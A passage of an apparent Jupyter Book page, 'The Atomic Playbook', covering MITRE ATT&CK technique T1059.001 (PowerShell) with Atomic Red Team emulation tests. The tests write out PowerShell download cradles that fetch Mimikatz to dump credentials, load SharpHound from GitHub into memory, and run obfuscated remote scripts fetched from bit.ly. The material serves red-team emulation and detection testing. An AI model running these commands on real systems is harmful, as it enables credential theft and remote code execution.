@@ -1,0 +1,970 @@
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title>T1059.001 - Command and Scripting Interpreter: PowerShell &#8212; The Atomic Playbook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
+    <link href="../../_static/css/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
+    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/language_data.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/mystnb.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
+    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
+    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="T1059.005 - Command and Scripting Interpreter: Visual Basic" href="T1059.005.html" />
+    <link rel="prev" title="T1064 - Scripting" href="T1064.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="docsearch:language" content="en">
+
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="../../index.html">
+  
+  <img src="../../_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
+  
+</a>
+</div>
+
+<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+  <ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../intro.html">
+   Welcome to the Atomic Playbook
+  </a>
+ </li>
+</ul>
+<ul class="current nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../initial-access.html">
+   Initial Access
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="reference internal" href="../execution.html">
+   Execution
+  </a>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1569.002.html">
+     T1569.002 - System Services: Service Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1072.html">
+     T1072 - Software Deployment Tools
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1204.002.html">
+     T1204.002 - User Execution: Malicious Link
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1569.001.html">
+     T1569.001 - System Services: Launchctl
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.html">
+     T1053 - Scheduled Task/Job
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1129.html">
+     T1129 - Shared Modules
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1175.html">
+     T1175 - Component Object Model and Distributed COM
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1559.html">
+     T1559 - Inter-Process Communication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1153.html">
+     T1153 - Source
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1204.001.html">
+     T1204.001 - Malicious Link
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.003.html">
+     T1059.003 - Command and Scripting Interpreter: Windows Command Shell
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.004.html">
+     T1053.004 - Scheduled Task/Job: Launchd
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.html">
+     T1059 - Command and Scripting Interpreter
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1064.html">
+     T1064 - Scripting
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     T1059.001 - Command and Scripting Interpreter: PowerShell
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.005.html">
+     T1059.005 - Command and Scripting Interpreter: Visual Basic
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1204.html">
+     T1204 - User Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.002.html">
+     T1053.002 - Scheduled Task/Job: At (Windows)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1559.001.html">
+     T1559.001 - Component Object Model
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.007.html">
+     T1059.007 - JavaScript/JScript
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1569.html">
+     T1569 - System Services
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.002.html">
+     T1059.002 - Command and Scripting Interpreter: AppleScript
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.005.html">
+     T1053.005 - Scheduled Task/Job: Scheduled Task
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1203.html">
+     T1203 - Exploitation for Client Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1559.002.html">
+     T1559.002 - Inter-Process Communication: Dynamic Data Exchange
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.001.html">
+     T1053.001 - Scheduled Task/Job: At (Linux)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1106.html">
+     T1106 - Native API
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1047.html">
+     T1047 - Windows Management Instrumentation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.006.html">
+     T1059.006 - Python
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1059.004.html">
+     T1059.004 - Command and Scripting Interpreter: Bash
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1061.html">
+     T1061 - Graphical User Interface
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1053.003.html">
+     T1053.003 - Scheduled Task/Job: Cron
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../persistence.html">
+   Persistence
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../privilege-escalation.html">
+   Privilege Escalation
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../defense-evasion.html">
+   Defense Evasion
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../credential-access.html">
+   Credential Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../discovery.html">
+   Discovery
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../lateral-movement.html">
+   Lateral Movement
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../collection.html">
+   Collection
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../command-and-control.html">
+   Command and Control
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../exfiltration.html">
+   Exfiltration
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../impact.html">
+   Impact
+  </a>
+ </li>
+</ul>
+
+</nav>
+
+ <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        <div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/tactics/execution/T1059.001.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+    
+</div>
+        <!-- Source interaction buttons -->
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#atomic-tests">
+   Atomic Tests
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-1-mimikatz">
+     Atomic Test #1 - Mimikatz
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-2-run-bloodhound-from-local-disk">
+     Atomic Test #2 - Run BloodHound from local disk
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-3-run-bloodhound-from-memory-using-download-cradle">
+     Atomic Test #3 - Run Bloodhound from Memory using Download Cradle
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id1">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-4-obfuscation-tests">
+     Atomic Test #4 - Obfuscation Tests
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id2">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-5-mimikatz-cradlecraft-pssendkeys">
+     Atomic Test #5 - Mimikatz - Cradlecraft PsSendKeys
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id3">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-6-invoke-apppathbypass">
+     Atomic Test #6 - Invoke-AppPathBypass
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id4">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-7-powershell-msxml-com-object-with-prompt">
+     Atomic Test #7 - Powershell MsXml COM object - with prompt
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-8-powershell-xml-requests">
+     Atomic Test #8 - Powershell XML requests
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id6">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-9-powershell-invoke-mshta-exe-download">
+     Atomic Test #9 - Powershell invoke mshta.exe download
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id7">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-10-powershell-invoke-downloadcradle">
+     Atomic Test #10 - Powershell Invoke-DownloadCradle
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-11-powershell-fileless-script-execution">
+     Atomic Test #11 - PowerShell Fileless Script Execution
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id8">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-12-powershell-downgrade-attack">
+     Atomic Test #12 - PowerShell Downgrade Attack
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id9">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-13-ntfs-alternate-data-stream-access">
+     Atomic Test #13 - NTFS Alternate Data Stream Access
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id10">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-14-powershell-session-creation-and-use">
+     Atomic Test #14 - PowerShell Session Creation and Use
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id11">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+ </li>
+</ul>
+
+        </nav>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="t1059-001-command-and-scripting-interpreter-powershell">
+<h1>T1059.001 - Command and Scripting Interpreter: PowerShell<a class="headerlink" href="#t1059-001-command-and-scripting-interpreter-powershell" title="Permalink to this headline">¶</a></h1>
+<p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).</p>
+<p>PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.</p>
+<p>A number of PowerShell-based offensive testing tools are available, including <a class="reference external" href="https://attack.mitre.org/software/S0363">Empire</a>,  <a class="reference external" href="https://attack.mitre.org/software/S0194">PowerSploit</a>, <a class="reference external" href="https://attack.mitre.org/software/S0378">PoshC2</a>, and PSAttack.(Citation: Github PSAttack)</p>
+<p>PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell’s underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</p>
+<div class="section" id="atomic-tests">
+<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-1-mimikatz">
+<h3>Atomic Test #1 - Mimikatz<a class="headerlink" href="#atomic-test-1-mimikatz" title="Permalink to this headline">¶</a></h3>
+<p>Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-command-prompt">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;#{mimurl}&#39;); Invoke-Mimikatz -DumpCreds&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-2-run-bloodhound-from-local-disk">
+<h3>Atomic Test #2 - Run BloodHound from local disk<a class="headerlink" href="#atomic-test-2-run-bloodhound-from-local-disk" title="Permalink to this headline">¶</a></h3>
+<p>Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.</p>
+<p>Successful execution will produce stdout message stating “SharpHound Enumeration Completed”. Upon completion, final output will be a *BloodHound.zip file.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-powershell">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">write-host</span> <span class="s2">&quot;Import and Execution of SharpHound.ps1 from #{file_path}&quot;</span> <span class="n">-ForegroundColor</span> <span class="n">Cyan</span>
+<span class="nb">import-module</span> <span class="c">#{file_path}\SharpHound.ps1</span>
+<span class="nb">Invoke-BloodHound</span> <span class="n">-OutputDirectory</span> <span class="nv">$env:Temp</span>
+<span class="nb">Start-Sleep</span> <span class="n">5</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-3-run-bloodhound-from-memory-using-download-cradle">
+<h3>Atomic Test #3 - Run Bloodhound from Memory using Download Cradle<a class="headerlink" href="#atomic-test-3-run-bloodhound-from-memory-using-download-cradle" title="Permalink to this headline">¶</a></h3>
+<p>Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.</p>
+<p>Successful execution will produce stdout message stating “SharpHound Enumeration Completed”. Upon completion, final output will be a *BloodHound.zip file.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id1">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">write-host</span> <span class="s2">&quot;Remote download of SharpHound.ps1 into memory, followed by execution of the script&quot;</span> <span class="n">-ForegroundColor</span> <span class="n">Cyan</span>
+<span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1&#39;</span><span class="p">);</span>
+<span class="nb">Invoke-BloodHound</span> <span class="n">-OutputDirectory</span> <span class="nv">$env:Temp</span>
+<span class="nb">Start-Sleep</span> <span class="n">5</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-4-obfuscation-tests">
+<h3>Atomic Test #4 - Obfuscation Tests<a class="headerlink" href="#atomic-test-4-obfuscation-tests" title="Permalink to this headline">¶</a></h3>
+<p>Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: “SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION”</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id2">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>(New-Object Net.WebClient).DownloadFile(&#39;http://bit.ly/L3g1tCrad1e&#39;,&#39;Default_File_Path.ps1&#39;);IEX((-Join([IO.File]::ReadAllBytes(&#39;Default_File_Path.ps1&#39;)|ForEach-Object{[Char]$_})))
+(New-Object Net.WebClient).DownloadFile(&#39;http://bit.ly/L3g1tCrad1e&#39;,&#39;Default_File_Path.ps1&#39;);[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes(&#39;Default_File_Path.ps1&#39;)|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
+Set-Variable HJ1 &#39;http://bit.ly/L3g1tCrad1e&#39;;SI Variable:/0W &#39;Net.WebClient&#39;;Set-Item Variable:\gH &#39;Default_File_Path.ps1&#39;;ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like&#39;*Cm*t&#39;}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like&#39;*om*e&#39;}).Name).Invoke(&#39;*w-*ct&#39;,$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like&#39;*w*i*le&#39;}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&amp;( &#39;&#39;.IsNormalized.ToString()[13,15,48]-Join&#39;&#39;)(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-5-mimikatz-cradlecraft-pssendkeys">
+<h3>Atomic Test #5 - Mimikatz - Cradlecraft PsSendKeys<a class="headerlink" href="#atomic-test-5-mimikatz-cradlecraft-pssendkeys" title="Permalink to this headline">¶</a></h3>
+<p>Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id3">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
